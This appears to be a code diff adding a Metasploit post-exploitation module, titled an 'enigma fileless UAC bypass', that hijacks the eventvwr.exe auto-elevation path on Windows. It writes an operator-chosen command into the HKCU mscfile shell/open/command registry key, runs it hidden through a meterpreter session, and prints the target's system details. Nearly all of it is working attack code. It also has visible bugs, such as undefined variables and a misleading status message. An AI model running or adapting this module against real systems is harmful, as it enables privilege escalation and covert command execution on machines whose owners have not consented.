@@ -135,3 +135,110 @@ class MetasploitModule < Msf::Post
         end
 
 
+
+
+# -------------------------------------------------------
+# GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
+# -------------------------------------------------------
+def ls_stage1
+
+  r=''
+  session = client
+  exec_comm = datastore['CMD_COMMAND']                        # my cmd command to execute
+  # def_value = '(default)'                                   # registry key value (/ve = default = empty)
+  comm_path = '%WINDIR%\\System32\\cmd.exe /c'                # %comspec% path 
+  vul_serve = '%WINDIR%\\System32\\eventvwr.exe'              # vulnerable soft to be hijacked
+  reg_clean = 'REG ADD HKCU\\Software\\Classes\\mscfile'      # registry hive to be clean in the end
+  regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
+  comm_inje = '#{regi_hive} /ve /t REG_SZ /d #{exec_comm} /f' # injection registry oneliner command
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['CMD_COMMAND'] == 'nil'
+    print_error("Options not configurated correctly...")
+    print_warning("Please set CMD_COMMAND option!")
+    return nil
+  else
+    print_status("Hijacking eventvwr.exe software!")
+    sleep(1.5)
+  end
+
+
+    # search in target regedit for registry key existence
+    print_warning("Reading service hive registry keys...")
+    sleep(1.0)
+    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
+      print_good(" Remote registry key found!")
+      sleep(1.0)
+    else
+       print_error("ABORT: post-module cant registry key needed...")
+       sleep(1.0)
+       return nil
+    end
+
+
+    # execute hijacking...
+    print_good(" Execute => sc stop #{s_name}")
+    r = session.sys.process.execute("#{comm_path} #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
+    sleep(2.0)
+
+
+end
+
+
+
+
+
+# ------------------------------------------------
+# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
+# Running sellected modules against session target
+# ------------------------------------------------
+def run
+  session = client
+
+      # Variable declarations (msf API calls)
+      sysnfo = session.sys.config.sysinfo
+      runtor = client.sys.config.getuid
+      runsession = client.session_host
+      directory = client.fs.dir.pwd
+
+
+    # Print banner and scan results on screen
+    print_line("    +----------------------------------------------+")
+    print_line("    | enigma fileless uac bypass command execution |")
+    print_line("    |             Author: r00t-3xp10it             |")
+    print_line("    +----------------------------------------------+")
+    print_line("")
+    print_line("    Running on session  : #{datastore['SESSION']}")
+    print_line("    Computer            : #{sysnfo['Computer']}")
+    print_line("    Operative System    : #{sysnfo['OS']}")
+    print_line("    Target IP addr      : #{runsession}")
+    print_line("    Payload directory   : #{directory}")
+    print_line("    Client UID          : #{runtor}")
+    print_line("")
+    print_line("")
+
+
+    # check for proper session.
+    if not sysinfo.nil?
+      print_status("Running module against: #{sysnfo['Computer']}")
+    else
+      print_error("[ ABORT ]:This post-module only works in meterpreter sessions")
+      raise Rex::Script::Completed
+    end
+    # elevate session privileges befor runing options
+    client.sys.config.getprivs.each do |priv|
+    end
+
+ 
+# ------------------------------------
+# Selected settings to run
+# ------------------------------------
+      if datastore['CMD_COMMAND']
+         ls_stage1
+      end
+
+      if datastore['DEL_REGKEY']
+         ls_stage2
+      end
+   end
+end
